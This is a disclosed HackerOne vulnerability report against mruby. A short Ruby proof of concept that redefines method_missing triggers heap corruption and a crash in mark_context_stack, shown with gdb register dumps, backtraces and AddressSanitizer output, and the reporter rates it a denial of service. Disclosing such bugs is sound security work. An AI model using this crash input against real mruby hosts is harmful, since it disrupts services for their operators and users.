# SIGABRT - method_missing - mark_context_stack

## Report Details
- **Report ID**: 205284
- **URL**: https://hackerone.com/reports/205284
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-10T15:45:39.699Z
- **Disclosed**: 2017-03-29T23:32:37.011Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_method_missing.rb):

	def method_missing(e,*)0.n||=0
	00end
	b

Debug - mirb
-------------------

	(gdb) r test_method_missing.rb 
	Starting program: /home/x/Desktop/research/test/mruby/bin/mirb test_method_missing.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	*** Error in `/home/x/Desktop/research/test/mruby/bin/mirb': realloc(): invalid next size: 0x00000000006c0e20 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) info reg
	rax            0x0	0
	rbx            0x72	114
	rcx            0xffffffffffffffff	-1
	rdx            0x6	6
	rsi            0x6268	25192
	rdi            0x6268	25192
	rbp            0x7fffffffc2a0	0x7fffffffc2a0
	rsp            0x7fffffffbf08	0x7fffffffbf08
	r8             0x3032653063363030	3472949521153404976
	r9             0x742f686372616573	8372025008635078003
	r10            0x8	8
	r11            0x246	582
	r12            0x7fffffffc0b0	140737488339120
	r13            0x7	7
	r14            0x72	114
	r15            0x7	7
	rip            0x7ffff7744f79	0x7ffff7744f79 <__GI_raise+57>
	eflags         0x246	[ PF ZF IF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	
Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x6c0e10, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x6c0e20, bytes=4096) at malloc.c:3029
	#6  0x0000000000429719 in mrb_default_allocf (mrb=0x6ae010, p=0x6c0e20, size=4096, ud=0x0) at /home/x/Desktop/research/test/mruby/src/state.c:60
	#7  0x0000000000431998 in mrb_realloc_simple (mrb=0x6ae010, p=0x6c0e20, len=4096) at /home/x/Desktop/research/test/mruby/src/gc.c:201
	#8  0x0000000000431a1a in mrb_realloc (mrb=0x6ae010, p=0x6c0e20, len=4096) at /home/x/Desktop/research/test/mruby/src/gc.c:215
	#9  0x00000000004063cf in stack_extend_alloc (mrb=0x6ae010, room=6, keep=3) at /home/x/Desktop/research/test/mruby/src/vm.c:156
	#10 0x00000000004064d5 in stack_extend (mrb=0x6ae010, room=6, keep=3) at /home/x/Desktop/research/test/mruby/src/vm.c:173
	#11 0x000000000040a0ce in mrb_vm_exec (mrb=0x6ae010, proc=0x6b1150, pc=0x71c2fc) at /home/x/Desktop/research/test/mruby/src/vm.c:1248
	#12 0x00000000004082e6 in mrb_vm_run (mrb=0x6ae010, proc=0x6b10f0, self=..., stack_keep=1) at /home/x/Desktop/research/test/mruby/src/vm.c:801
	#13 0x0000000000402b90 in main (argc=2, argv=0x7fffffffe058) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
-------------------

	x@x:~/Desktop/research/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_method_missing.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	ASAN:DEADLYSIGNAL
	=================================================================
	==843==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052ecad bp 0x7fff76be8fa0 sp 0x7fff76be8f50 T0)
		#0 0x52ecac in mark_context_stack /home/x/Desktop/research/test/clang/mruby/src/gc.c:554:11
		#1 0x52eac3 in mark_context /home/x/Desktop/research/test/clang/mruby/src/gc.c:571:3
		#2 0x52e572 in root_scan_phase /home/x/Desktop/research/test/clang/mruby/src/gc.c:867:3
		#3 0x52e20f in incremental_gc /home/x/Desktop/research/test/clang/mruby/src/gc.c:1074:5
		#4 0x52d66d in incremental_gc_step /home/x/Desktop/research/test/clang/mruby/src/gc.c:1115:15
		#5 0x52d2e0 in mrb_incremental_gc /home/x/Desktop/research/test/clang/mruby/src/gc.c:1159:5
		#6 0x52d158 in mrb_obj_alloc /home/x/Desktop/research/test/clang/mruby/src/gc.c:507:5
		#7 0x50db34 in ary_new_capa /home/x/Desktop/research/test/clang/mruby/src/array.c:30:23
		#8 0x50da97 in mrb_ary_new_capa /home/x/Desktop/research/test/clang/mruby/src/array.c:41:22
		#9 0x4fc908 in mrb_vm_exec /home/x/Desktop/research/test/clang/mruby/src/vm.c:1526:26
		#10 0x4f984e in mrb_vm_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:801:10
		#11 0x4f3010 in main /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#12 0x7f8f26c16ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#13 0x41a575 in _start (/home/x/Desktop/research/test/clang/mruby/bin/mirb+0x41a575)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/test/clang/mruby/src/gc.c:554:11 in mark_context_stack
	==843==ABORTING


Debug - mruby
--------------------

	(gdb) r test_method_missing.rb 
	Starting program: /home/x/Desktop/research/test/mruby/bin/mruby test_method_missing.rb
	*** Error in `/home/x/Desktop/research/test/mruby/bin/mruby': realloc(): invalid next size: 0x00000000006bfe20 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) info reg
	rax            0x0	0
	rbx            0x73	115
	rcx            0xffffffffffffffff	-1
	rdx            0x6	6
	rsi            0x2356	9046
	rdi            0x2356	9046
	rbp            0x7fffffffd3d0	0x7fffffffd3d0
	rsp            0x7fffffffd038	0x7fffffffd038
	r8             0x3032656662363030	3472949753064861744
	r9             0x7365742f68637261	8315180033973121633
	r10            0x8	8
	r11            0x246	582
	r12            0x7fffffffd1e0	140737488343520
	r13            0x7	7
	r14            0x73	115
	r15            0x7	7
	rip            0x7ffff7744f79	0x7ffff7744f79 <__GI_raise+57>
	eflags         0x246	[ PF ZF IF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x6bfe10, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x6bfe20, bytes=4096) at malloc.c:3029
	#6  0x0000000000426aa0 in mrb_default_allocf (mrb=0x6ad010, p=0x6bfe20, size=4096, ud=0x0) at /home/x/Desktop/research/test/mruby/src/state.c:60
	#7  0x000000000042ed1f in mrb_realloc_simple (mrb=0x6ad010, p=0x6bfe20, len=4096) at /home/x/Desktop/research/test/mruby/src/gc.c:201
	#8  0x000000000042eda1 in mrb_realloc (mrb=0x6ad010, p=0x6bfe20, len=4096) at /home/x/Desktop/research/test/mruby/src/gc.c:215
	#9  0x00000000004062c6 in stack_extend_alloc (mrb=0x6ad010, room=6, keep=3) at /home/x/Desktop/research/test/mruby/src/vm.c:156
	#10 0x00000000004063cc in stack_extend (mrb=0x6ad010, room=6, keep=3) at /home/x/Desktop/research/test/mruby/src/vm.c:173
	#11 0x0000000000409fc5 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0120, pc=0x71b3dc) at /home/x/Desktop/research/test/mruby/src/vm.c:1248
	#12 0x00000000004081dd in mrb_vm_run (mrb=0x6ad010, proc=0x6b0150, self=..., stack_keep=0) at /home/x/Desktop/research/test/mruby/src/vm.c:801
	#13 0x000000000041034f in mrb_top_run (mrb=0x6ad010, proc=0x6b0150, self=..., stack_keep=0) at /home/x/Desktop/research/test/mruby/src/vm.c:2547
	#14 0x0000000000442301 in mrb_load_exec (mrb=0x6ad010, p=0x709490, c=0x7080e0) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#15 0x0000000000442397 in mrb_load_file_cxt (mrb=0x6ad010, f=0x7090d0, c=0x7080e0) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-compiler/core/parse.y:5764
	#16 0x00000000004024f8 in main (argc=2, argv=0x7fffffffe058) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232


Clang - mruby
-------------------
	
	x@x:~/Desktop/research/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_method_missing.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==1064==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052b20d bp 0x7fff60b78140 sp 0x7fff60b780f0 T0)
		#0 0x52b20c in mark_context_stack /home/x/Desktop/research/test/clang/mruby/src/gc.c:554:11
		#1 0x52b023 in mark_context /home/x/Desktop/research/test/clang/mruby/src/gc.c:571:3
		#2 0x52aad2 in root_scan_phase /home/x/Desktop/research/test/clang/mruby/src/gc.c:867:3
		#3 0x52a76f in incremental_gc /home/x/Desktop/research/test/clang/mruby/src/gc.c:1074:5
		#4 0x529bcd in incremental_gc_step /home/x/Desktop/research/test/clang/mruby/src/gc.c:1115:15
		#5 0x529840 in mrb_incremental_gc /home/x/Desktop/research/test/clang/mruby/src/gc.c:1159:5
		#6 0x5296b8 in mrb_obj_alloc /home/x/Desktop/research/test/clang/mruby/src/gc.c:507:5
		#7 0x50d804 in ary_new_capa /home/x/Desktop/research/test/clang/mruby/src/array.c:30:23
		#8 0x50d767 in mrb_ary_new_capa /home/x/Desktop/research/test/clang/mruby/src/array.c:41:22
		#9 0x4fc518 in mrb_vm_exec /home/x/Desktop/research/test/clang/mruby/src/vm.c:1526:26
		#10 0x4f945e in mrb_vm_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:801:10
		#11 0x501aa3 in mrb_top_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:2533:12
		#12 0x536020 in mrb_load_exec /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7
		#13 0x5361f2 in mrb_load_file_cxt /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10
		#14 0x4f2bb5 in main /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
		#15 0x7f48614caec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#16 0x41a4e5 in _start (/home/x/Desktop/research/test/clang/mruby/bin/mruby+0x41a4e5)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/test/clang/mruby/src/gc.c:554:11 in mark_context_stack
	==1064==ABORTING
	
Impact
--------------------

As far as I can see, it is not exploitable. But it can cause DoS.

## Attachments
- test_method_missing.rb
